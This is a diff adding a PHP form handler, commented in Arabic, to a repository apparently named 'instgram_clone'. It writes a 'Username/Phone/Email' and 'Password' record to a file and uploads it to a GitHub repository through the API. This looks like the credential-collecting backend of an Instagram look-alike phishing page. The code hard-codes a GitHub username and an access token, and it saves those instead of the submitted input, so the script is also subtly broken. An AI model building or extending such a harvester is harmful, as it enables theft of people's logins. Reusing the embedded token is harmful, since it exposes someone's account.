@@ -1,0 +1,61 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = 'oussama894'; // اسم المستخدم في GitHub
+    $password = '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'; // كلمة المرور أو رمز الوصول
+    
+    // البيانات التي سيتم حفظها بالتنسيق المطلوب (مثل "05 April 1999")
+    $formattedDate = date('d F Y');
+
+    // البيانات التي ستتم حفظها في ملف نصي
+    $data = "Date: $formattedDate\n";
+    $data .= "Username/Phone/Email: $username\n";
+    $data .= "Password: $password\n\n";
+
+    // اسم الملف الذي سيتم رفعه إلى مستودع GitHub
+    $filename = 'userdata.txt';
+
+    // البيانات الخاصة بالمستودع على GitHub
+    $repo_owner = 'oussama894'; // مالك المستودع
+    $repo_name = 'instgram_clone'; // اسم المستودع
+
+    // تكوين المعلومات الأساسية لوصول GitHub API
+    $github_api_url = "https://api.github.com/repos/$repo_owner/$repo_name/contents/Data/$filename";
+    $github_api_auth = base64_encode("$username:$password");
+
+    // البيانات التي سترسلها إلى GitHub API لإنشاء الملف
+    $post_data = json_encode(array(
+        'message' => 'Add user data',
+        'content' => base64_encode($data),
+    ));
+
+    // تكوين خيارات طلب cURL
+    $curl_options = array(
+        CURLOPT_URL => $github_api_url,
+        CURLOPT_RETURNTRANSFER => 1,
+        CURLOPT_CUSTOMREQUEST => 'PUT',
+        CURLOPT_POSTFIELDS => $post_data,
+        CURLOPT_HTTPHEADER => array(
+            "Authorization: Basic $github_api_auth",
+            "User-Agent: YourAppName",
+            "Content-Type: application/json",
+        ),
+    );
+
+    // إنشاء موجودة cURL وتنفيذ الطلب
+    $ch = curl_init();
+    curl_setopt_array($ch, $curl_options);
+    $response = curl_exec($ch);
+
+    // التحقق من نجاح الطلب
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($http_code === 201) {
+        // تم رفع الملف بنجاح
+        echo "تم رفع الملف بنجاح.";
+    } else {
+        // فشل في رفع الملف
+        echo "فشل في رفع الملف.";
+    }
+}
+?>
